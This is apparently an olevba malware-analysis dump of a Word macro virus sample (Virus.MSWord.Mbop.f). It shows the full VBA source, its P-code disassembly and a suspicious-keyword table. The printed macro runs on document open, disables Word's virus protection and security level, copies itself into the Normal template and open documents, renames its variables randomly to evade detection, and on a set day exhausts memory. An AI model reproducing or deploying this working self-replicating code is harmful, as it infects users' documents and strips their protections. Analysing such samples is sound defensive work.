olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mbop.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mbop.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Docuauent_Open()
On Error Resuaue Next
auhhau = 1
aul1au = "M"
Systeau.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1&"
Options.VirusProtection = False
Options.SaveNoraualProaupt = False
aufiau = 1
Options.ConfirauConversions = False
Set auNtau = NoraualTeauplate.VBProject.VBCoauponents.Iteau(1).CodeModule
au11au = 1
Set auAdau = ActiveDocuauent.VBProject.VBCoauponents.Iteau(1).CodeModule
auseau = 3
Set auTdau = ThisDocuauent.VBProject.VBCoauponents.Iteau(1).CodeModule
autrau = 3
aul2au = "b"
aufnau = aufiau & auseau & autrau
For auiiau = 1 To auTdau.countoflines
If InStr(auTdau.lines(auiiau, 1), "Private Sub Docuauent_Open()") <> 0 Then
auSlau = auiiau
Exit For
End If
Next
aul3au = "o"
auVcau = Triau(auTdau.lines(auSlau, auSlau + aufnau))
aulvau = 97
au15au = 15
If auNtau.countoflines > 0 Then
auNlau = auNtau.lines(1, auNtau.countoflines)
If InStr(auNlau, "Nt") = 0 And InStr(auNlau, "Sl") = 0 And InStr(auNlau, "Nl") = 0 And InStr(auNlau, "Ad") = 0 And InStr(auNlau, "Vc") = 0 And InStr(auNlau, "Td") = 0 Then
If InStr(LCase(auNlau), "private sub docuauent_open()") <> 0 Then
For auiau = 1 To auNtau.countoflines
If InStr(LCase(auNtau.lines(auiau, 1)), "private sub docuauent_open()") <> 0 Then
aunsau = auiau
Exit For
End If
Next
For auiau = aunsau To auNtau.countoflines
If InStr(LCase(auNtau.lines(auiau, 1)), "end sub") <> 0 Then
auneau = auiau
Exit For
End If
Next
auNtau.deletelines aunsau, auneau
End If
If InStr(LCase(auNlau), "option explicit") <> 0 Then
For auiau = 1 To auNtau.countoflines
If InStr(LCase(auNtau.lines(auiau, 1)), "option explicit") <> 0 Then
aunsau = auiau
Exit For
End If
Next
auNtau.deletelines aunsau, 1
End If
auNtau.addfroaustring auVcau
auNtau.Save
auinau = auhhau
End If
Else
auNtau.addfroaustring auVcau
auNtau.Save
auinau = auhhau
End If
auhvau = 122
auiau = 1
audqau = Docuauents.Count
If auAdau.countoflines > 0 Then
auAlau = auAdau.lines(1, auAdau.countoflines)
If InStr(auAlau, "Nt") = 0 And InStr(auAlau, "Sl") = 0 And InStr(auAlau, "Nl") = 0 And InStr(auAlau, "Ad") = 0 And InStr(auAlau, "Vc") = 0 And InStr(auAlau, "Td") = 0 Then
If InStr(LCase(auAlau), "private sub docuauent_open()") <> 0 Then
For auiau = 1 To auAdau.countoflines
If InStr(LCase(auAdau.lines(auiau, 1)), "private sub docuauent_open()") <> 0 Then
aunsau = auiau
Exit For
End If
Next
For auiau = aunsau To auAdau.countoflines
If InStr(LCase(auAdau.lines(auiau, 1)), "end sub") <> 0 Then
auneau = auiau
Exit For
End If
Next
auAdau.deletelines aunsau, auneau
End If
If InStr(LCase(auAlau), "option explicit") <> 0 Then
For auiau = 1 To auAdau.countoflines
If InStr(LCase(auAdau.lines(auiau, 1)), "option explicit") <> 0 Then
aunsau = auiau
Exit For
End If
Next
auAdau.deletelines aunsau, 1
End If
auAdau.addfroaustring auVcau
auiaau = auhhau
End If
Else
auAdau.addfroaustring auVcau
auiaau = auhhau
End If
aul4au = "p"
Randoauize
au15au = Int((au15au - au11au + au11au) * Rnd + au11au)
For auiiau = 1 To au15au
Randoauize
auTnau = auTnau & Chr(Int((auhvau - aulvau + 1) * Rnd + aulvau))
Next
aud2au = 9
auVcau = auTdau.lines(1, auTdau.countoflines)
auTdau.deletelines 1, auTdau.countoflines
Do While InStr(auVcau, "au") <> 0
auVcau = Mid(auVcau, 1, InStr(auVcau, "au") - 1) & auTnau & Mid(auVcau, InStr(auVcau, "au") + Len("au"))
Loop
auTdau.addfroaustring auVcau
audyau = Day(Now)
aud1au = 2
aul5au = "!"
If audyau = aud1au & aud2au Then
Diau austau()
aucaau = 0
Do
ReDiau Preserve austau(aucaau)
auqwau = CLng(1024)
auqaau = auqwau
auqzau = auqwau * auqaau
austau(aucaau) = String(auqzau, Right(auTnau, 1))
DoEvents
aucaau = aucaau + 1
Loop
End If
If auiaau = auhhau Or auinau = auhhau Then
MsgBox aul1au & aul2au & aul3au & aul4au & aul5au, vbCritical
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mbop.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7000 bytes
' Line #0:
' 	FuncDefn (Private Sub Docuauent_Open())
' Line #1:
' 	Reparse 0x0015 "On Error Resuaue Next"
' Line #2:
' 	LitDI2 0x0001 
' 	St auhhau 
' Line #3:
' 	LitStr 0x0001 "M"
' 	St aul1au 
' Line #4:
' 	LitStr 0x0002 "1&"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld Systeau 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNoraualProaupt 
' Line #7:
' 	LitDI2 0x0001 
' 	St aufiau 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirauConversions 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NoraualTeauplate 
' 	MemLd VBProject 
' 	MemLd VBCoauponents 
' 	ArgsMemLd Iteau 0x0001 
' 	MemLd CodeModule 
' 	Set auNtau 
' Line #10:
' 	LitDI2 0x0001 
' 	St au11au 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocuauent 
' 	MemLd VBProject 
' 	MemLd VBCoauponents 
' 	ArgsMemLd Iteau 0x0001 
' 	MemLd CodeModule 
' 	Set auAdau 
' Line #12:
' 	LitDI2 0x0003 
' 	St auseau 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocuauent 
' 	MemLd VBProject 
' 	MemLd VBCoauponents 
' 	ArgsMemLd Iteau 0x0001 
' 	MemLd CodeModule 
' 	Set auTdau 
' Line #14:
' 	LitDI2 0x0003 
' 	St autrau 
' Line #15:
' 	LitStr 0x0001 "b"
' 	St aul2au 
' Line #16:
' 	Ld aufiau 
' 	Ld auseau 
' 	Concat 
' 	Ld autrau 
' 	Concat 
' 	St aufnau 
' Line #17:
' 	StartForVariable 
' 	Ld auiiau 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld auTdau 
' 	MemLd countoflines 
' 	For 
' Line #18:
' 	Ld auiiau 
' 	LitDI2 0x0001 
' 	Ld auTdau 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x001C "Private Sub Docuauent_Open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #19:
' 	Ld auiiau 
' 	St auSlau 
' Line #20:
' 	ExitFor 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' 	LitStr 0x0001 "o"
' 	St aul3au 
' Line #24:
' 	Ld auSlau 
' 	Ld auSlau 
' 	Ld aufnau 
' 	Add 
' 	Ld auTdau 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Triau 0x0001 
' 	St auVcau 
' Line #25:
' 	LitDI2 0x0061 
' 	St aulvau 
' Line #26:
' 	LitDI2 0x000F 
' 	St au15au 
' Line #27:
' 	Ld auNtau 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld auNtau 
' 	MemLd countoflines 
' 	Ld auNtau 
' 	ArgsMemLd lines 0x0002 
' 	St auNlau 
' Line #29:
' 	Ld auNlau 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld auNlau 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld auNlau 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld auNlau 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld auNlau 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld auNlau 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #30:
' 	Ld auNlau 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001C "private sub docuauent_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld auiau 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld auNtau 
' 	MemLd countoflines 
' 	For 
' Line #32:
' 	Ld auiau 
' 	LitDI2 0x0001 
' 	Ld auNtau 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001C "private sub docuauent_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #33:
' 	Ld auiau 
' 	St aunsau 
' Line #34:
' 	ExitFor 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Next 
' Line #37:
' 	StartForVariable 
' 	Ld auiau 
' 	EndForVariable 
' 	Ld aunsau 
' 	Ld auNtau 
' 	MemLd countoflines 
' 	For 
' Line #38:
' 	Ld auiau 
' 	LitDI2 0x0001 
' 	Ld auNtau 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #39:
' 	Ld auiau 
' 	St auneau 
' Line #40:
' 	ExitFor 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' 	Ld aunsau 
' 	Ld auneau 
' 	Ld auNtau 
' 	ArgsMemCall deletelines 0x0002 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld auNlau 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld auiau 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld auNtau 
' 	MemLd countoflines 
' 	For 
' Line #47:
' 	Ld auiau 
' 	LitDI2 0x0001 
' 	Ld auNtau 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #48:
' 	Ld auiau 
' 	St aunsau 
' Line #49:
' 	ExitFor 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	Ld aunsau 
' 	LitDI2 0x0001 
' 	Ld auNtau 
' 	ArgsMemCall deletelines 0x0002 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Ld auVcau 
' 	Ld auNtau 
' 	ArgsMemCall addfroaustring 0x0001 
' Line #55:
' 	Ld auNtau 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	Ld auhhau 
' 	St auinau 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	Ld auVcau 
' 	Ld auNtau 
' 	ArgsMemCall addfroaustring 0x0001 
' Line #60:
' 	Ld auNtau 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	Ld auhhau 
' 	St auinau 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	LitDI2 0x007A 
' 	St auhvau 
' Line #64:
' 	LitDI2 0x0001 
' 	St auiau 
' Line #65:
' 	Ld Docuauents 
' 	MemLd Count 
' 	St audqau 
' Line #66:
' 	Ld auAdau 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld auAdau 
' 	MemLd countoflines 
' 	Ld auAdau 
' 	ArgsMemLd lines 0x0002 
' 	St auAlau 
' Line #68:
' 	Ld auAlau 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld auAlau 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld auAlau 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld auAlau 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld auAlau 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld auAlau 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #69:
' 	Ld auAlau 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001C "private sub docuauent_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld auiau 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld auAdau 
' 	MemLd countoflines 
' 	For 
' Line #71:
' 	Ld auiau 
' 	LitDI2 0x0001 
' 	Ld auAdau 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001C "private sub docuauent_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #72:
' 	Ld auiau 
' 	St aunsau 
' Line #73:
' 	ExitFor 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	StartForVariable 
' 	Next 
' Line #76:
' 	StartForVariable 
' 	Ld auiau 
' 	EndForVariable 
' 	Ld aunsau 
' 	Ld auAdau 
' 	MemLd countoflines 
' 	For 
' Line #77:
' 	Ld auiau 
' 	LitDI2 0x0001 
' 	Ld auAdau 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #78:
' 	Ld auiau 
' 	St auneau 
' Line #79:
' 	ExitFor 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	StartForVariable 
' 	Next 
' Line #82:
' 	Ld aunsau 
' 	Ld auneau 
' 	Ld auAdau 
' 	ArgsMemCall deletelines 0x0002 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld auAlau 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #85:
' 	StartForVariable 
' 	Ld auiau 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld auAdau 
' 	MemLd countoflines 
' 	For 
' Line #86:
' 	Ld auiau 
' 	LitDI2 0x0001 
' 	Ld auAdau 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #87:
' 	Ld auiau 
' 	St aunsau 
' Line #88:
' 	ExitFor 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Next 
' Line #91:
' 	Ld aunsau 
' 	LitDI2 0x0001 
' 	Ld auAdau 
' 	ArgsMemCall deletelines 0x0002 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Ld auVcau 
' 	Ld auAdau 
' 	ArgsMemCall addfroaustring 0x0001 
' Line #94:
' 	Ld auhhau 
' 	St auiaau 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	ElseBlock 
' Line #97:
' 	Ld auVcau 
' 	Ld auAdau 
' 	ArgsMemCall addfroaustring 0x0001 
' Line #98:
' 	Ld auhhau 
' 	St auiaau 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	LitStr 0x0001 "p"
' 	St aul4au 
' Line #101:
' 	ArgsCall Randoauize 0x0000 
' Line #102:
' 	Ld au15au 
' 	Ld au11au 
' 	Sub 
' 	Ld au11au 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld au11au 
' 	Add 
' 	FnInt 
' 	St au15au 
' Line #103:
' 	StartForVariable 
' 	Ld auiiau 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld au15au 
' 	For 
' Line #104:
' 	ArgsCall Randoauize 0x0000 
' Line #105:
' 	Ld auTnau 
' 	Ld auhvau 
' 	Ld aulvau 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld aulvau 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St auTnau 
' Line #106:
' 	StartForVariable 
' 	Next 
' Line #107:
' 	LitDI2 0x0009 
' 	St aud2au 
' Line #108:
' 	LitDI2 0x0001 
' 	Ld auTdau 
' 	MemLd countoflines 
' 	Ld auTdau 
' 	ArgsMemLd lines 0x0002 
' 	St auVcau 
' Line #109:
' 	LitDI2 0x0001 
' 	Ld auTdau 
' 	MemLd countoflines 
' 	Ld auTdau 
' 	ArgsMemCall deletelines 0x0002 
' Line #110:
' 	Ld auVcau 
' 	LitStr 0x0002 "au"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #111:
' 	Ld auVcau 
' 	LitDI2 0x0001 
' 	Ld auVcau 
' 	LitStr 0x0002 "au"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld auTnau 
' 	Concat 
' 	Ld auVcau 
' 	Ld auVcau 
' 	LitStr 0x0002 "au"
' 	FnInStr 
' 	LitStr 0x0002 "au"
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St auVcau 
' Line #112:
' 	Loop 
' Line #113:
' 	Ld auVcau 
' 	Ld auTdau 
' 	ArgsMemCall addfroaustring 0x0001 
' Line #114:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St audyau 
' Line #115:
' 	LitDI2 0x0002 
' 	St aud1au 
' Line #116:
' 	LitStr 0x0001 "!"
' 	St aul5au 
' Line #117:
' 	Ld audyau 
' 	Ld aud1au 
' 	Ld aud2au 
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #118:
' 	ArgsLd austau 0x0000 
' 	ArgsCall Diau 0x0001 
' Line #119:
' 	LitDI2 0x0000 
' 	St aucaau 
' Line #120:
' 	Do 
' Line #121:
' 	Reparse 0x001E "ReDiau Preserve austau(aucaau)"
' Line #122:
' 	LitDI2 0x0400 
' 	Coerce (Lng) 
' 	St auqwau 
' Line #123:
' 	Ld auqwau 
' 	St auqaau 
' Line #124:
' 	Ld auqwau 
' 	Ld auqaau 
' 	Mul 
' 	St auqzau 
' Line #125:
' 	Ld auqzau 
' 	Ld auTnau 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	ArgsLd String$ 0x0002 
' 	Ld aucaau 
' 	ArgsSt austau 0x0001 
' Line #126:
' 	ArgsCall DoEvents 0x0000 
' Line #127:
' 	Ld aucaau 
' 	LitDI2 0x0001 
' 	Add 
' 	St aucaau 
' Line #128:
' 	Loop 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Ld auiaau 
' 	Ld auhhau 
' 	Eq 
' 	Ld auinau 
' 	Ld auhhau 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #131:
' 	Ld aul1au 
' 	Ld aul2au 
' 	Concat 
' 	Ld aul3au 
' 	Concat 
' 	Ld aul4au 
' 	Concat 
' 	Ld aul5au 
' 	Concat 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndSub 
' Line #134:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

